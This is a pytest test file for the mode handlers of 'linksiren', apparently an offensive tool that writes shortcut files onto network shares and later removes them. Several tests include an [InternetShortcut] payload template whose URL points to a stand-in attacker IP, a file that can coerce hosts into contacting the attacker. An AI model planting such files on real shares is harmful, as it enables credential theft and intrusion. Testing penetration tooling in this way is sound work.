"""Tests for ``linksiren.mode_handlers``."""

from unittest.mock import MagicMock, patch
from pathlib import Path
import pytest

from linksiren.mode_handlers import (
    handle_generate,
    handle_rank,
    handle_identify,
    handle_deploy,
    handle_cleanup,
)


@pytest.fixture
def args():
    return MagicMock()


@pytest.fixture
def log_queue():
    return MagicMock()


# ---------------------------------------------------------------- generate ---


def test_handle_generate_invalid_payload_name(args):
    args.payload = "invalid_payload.txt"
    with patch("linksiren.mode_handlers.is_valid_payload_name", return_value=False):
        handle_generate(args)
        assert not Path(args.payload).exists()


def test_handle_generate_valid_payload_name(args):
    args.payload = "payload.lnk"
    args.attacker = "attacker_ip"
    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.get_lnk_template", return_value="lnk_template"),
        patch(
            "linksiren.mode_handlers.create_lnk_payload",
            return_value="payload_contents",
        ),
        patch("linksiren.mode_handlers.write_payload_local") as mock_write_payload_local,
    ):
        handle_generate(args)
        mock_write_payload_local.assert_called_once_with(args.payload, "payload_contents")


def test_handle_generate_payload_from_template(args):
    args.payload = "payload.url"
    args.attacker = "attacker_ip"
    template_content = (
        "[InternetShortcut]\n"
        "URL=http://{attacker_ip}/test\n"
        "WorkingDirectory=C:\\WINDOWS\\\n"
        "IconIndex=153\n"
        "IconFile=C:\\Windows\\System32\\imageres.dll"
    )

    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.Path.open", new_callable=MagicMock) as mock_open,
        patch("linksiren.mode_handlers.write_payload_local") as mock_write_payload_local,
    ):
        mock_open.return_value.__enter__.return_value.read.return_value = template_content
        handle_generate(args)
        expected_payload_contents = template_content.format(attacker_ip=args.attacker)
        mock_write_payload_local.assert_called_once_with(args.payload, expected_payload_contents)


# ------------------------------------------------------------------- rank ---


def test_handle_rank(args, credentials, log_queue):
    args.active_threshold = 30
    args.targets = "targets.txt"
    args.max_depth = 3
    args.fast = False
    args.max_concurrency = 4
    args.ignore_shares = ["C$", "ADMIN$", "SYSVOL"]
    with (
        patch("linksiren.mode_handlers.read_targets", return_value=[]),
        patch("linksiren.mode_handlers.get_sorted_rankings", return_value={}),
        patch("builtins.open", new_callable=MagicMock) as mock_open,
    ):
        handle_rank(args, credentials, log_queue)
        mock_open.assert_called_once_with("folder_rankings.txt", mode="w", encoding="utf-8")


# --------------------------------------------------------------- identify ---


def test_handle_identify(args, credentials, log_queue):
    args.active_threshold = 30
    args.targets = "targets.txt"
    args.max_depth = 3
    args.fast = False
    args.max_concurrency = 4
    args.max_folders_per_target = 5
    args.ignore_shares = ["C$", "ADMIN$", "SYSVOL"]
    with (
        patch("linksiren.mode_handlers.read_targets", return_value=[]),
        patch("linksiren.mode_handlers.get_sorted_rankings", return_value={}),
        patch("linksiren.mode_handlers.filter_targets", return_value=[]),
        patch("linksiren.mode_handlers.write_list_to_file") as mock_write_list_to_file,
    ):
        handle_identify(args, credentials, log_queue)
        mock_write_list_to_file.assert_called_once_with([], "payload_targets.txt")


# ----------------------------------------------------------------- deploy ---


def test_handle_deploy_invalid_payload_name(args, credentials):
    args.payload = "invalid_payload.txt"
    with (
        patch("linksiren.mode_handlers.read_targets", return_value=[MagicMock()]),
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=False),
    ):
        handle_deploy(args, credentials)
        assert not Path(args.payload).exists()


def test_handle_deploy_valid_payload_name(args, credentials):
    args.payload = "payload.lnk"
    args.attacker = "attacker_ip"
    args.targets = "targets.txt"
    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.read_targets", return_value=[MagicMock(paths=[])]),
        patch("linksiren.mode_handlers.get_lnk_template", return_value="lnk_template"),
        patch(
            "linksiren.mode_handlers.create_lnk_payload",
            return_value="payload_contents",
        ),
        patch("linksiren.mode_handlers.write_list_to_file") as mock_write_list_to_file,
    ):
        handle_deploy(args, credentials)
        mock_write_list_to_file.assert_called_once_with([], "payloads_written.txt", "w")


def test_handle_deploy_payload_from_template(args, credentials):
    args.payload = "payload.url"
    args.attacker = "attacker_ip"
    args.targets = "targets.txt"
    template_content = (
        "[InternetShortcut]\n"
        "URL=http://{attacker_ip}/test\n"
        "WorkingDirectory=C:\\WINDOWS\\\n"
        "IconIndex=153\n"
        "IconFile=C:\\Windows\\System32\\imageres.dll"
    )
    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.read_targets", return_value=[MagicMock(paths=[])]),
        patch("builtins.open", new_callable=MagicMock) as mock_open,
        patch("linksiren.mode_handlers.write_list_to_file") as mock_write_list_to_file,
    ):
        mock_open.return_value.__enter__.return_value.read.return_value = template_content
        handle_deploy(args, credentials)
        mock_write_list_to_file.assert_called_once_with([], "payloads_written.txt", "w")


def test_handle_deploy_write_payload(args, credentials):
    args.payload = "payload.url"
    args.attacker = "attacker_ip"
    args.targets = "targets.txt"
    template_content = (
        "[InternetShortcut]\n"
        "URL=http://{attacker_ip}/test\n"
        "WorkingDirectory=C:\\WINDOWS\\\n"
        "IconIndex=153\n"
        "IconFile=C:\\Windows\\System32\\imageres.dll"
    )
    mock_target = MagicMock()
    mock_target.host = "test_host"
    mock_target.paths = ["test_path"]
    mock_target.write_payload.return_value = "\\\\test_host\\test_path"

    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.read_targets", return_value=[mock_target]),
        patch("builtins.open", new_callable=MagicMock) as mock_open,
        patch("linksiren.mode_handlers.write_list_to_file") as mock_write_list_to_file,
    ):
        mock_open.return_value.__enter__.return_value.read.return_value = template_content
        handle_deploy(args, credentials)

        expected_payload_contents = template_content.format(attacker_ip=args.attacker)
        mock_target.write_payload.assert_called_once_with(
            path="test_path",
            payload_name=args.payload,
            payload=expected_payload_contents,
        )
        mock_write_list_to_file.assert_called_once_with(
            [r"\\test_host\test_path"], "payloads_written.txt", "w"
        )


# ---------------------------------------------------------------- cleanup ---


def test_handle_cleanup(args, credentials):
    args.payload = "payload.url"
    mock_target = MagicMock()
    mock_target.host = "test_host"
    mock_target.paths = ["test_path"]
    mock_target.delete_payloads.return_value = []

    with patch("linksiren.mode_handlers.read_targets", return_value=[mock_target]):
        handle_cleanup(args, credentials)
        mock_target.connect.assert_called_once_with(credentials)
        mock_target.delete_payloads.assert_called_once()


def test_handle_cleanup_multiple_targets(args, credentials):
    args.payload = "payload.url"
    mock_target1 = MagicMock(host="test_host1", paths=["test_path1"])
    mock_target1.delete_payloads.return_value = []
    mock_target2 = MagicMock(host="test_host2", paths=["test_path2"])
    mock_target2.delete_payloads.return_value = []

    with patch(
        "linksiren.mode_handlers.read_targets",
        return_value=[mock_target1, mock_target2],
    ):
        handle_cleanup(args, credentials)
        mock_target1.connect.assert_called_once_with(credentials)
        mock_target1.delete_payloads.assert_called_once()
        mock_target2.connect.assert_called_once_with(credentials)
        mock_target2.delete_payloads.assert_called_once()


def test_handle_cleanup_accumulates_failures(args, credentials):
    """Regression — failures from earlier hosts must not be dropped."""
    args.payload = "payload.url"
    t1 = MagicMock(host="h1", paths=["p"])
    t1.delete_payloads.return_value = ["\\\\h1\\p"]
    t2 = MagicMock(host="h2", paths=["p"])
    t2.delete_payloads.return_value = ["\\\\h2\\p"]

    with (
        patch("linksiren.mode_handlers.read_targets", return_value=[t1, t2]),
        patch("linksiren.mode_handlers.write_list_to_file") as mock_write,
    ):
        handle_cleanup(args, credentials)
        mock_write.assert_called_once_with(
            ["\\\\h1\\p", "\\\\h2\\p"], "payloads_not_deleted.txt", "w"
        )


def test_handle_cleanup_no_targets(args, credentials):
    args.payload = "payload.url"
    with patch("linksiren.mode_handlers.read_targets", return_value=[]):
        handle_cleanup(args, credentials)
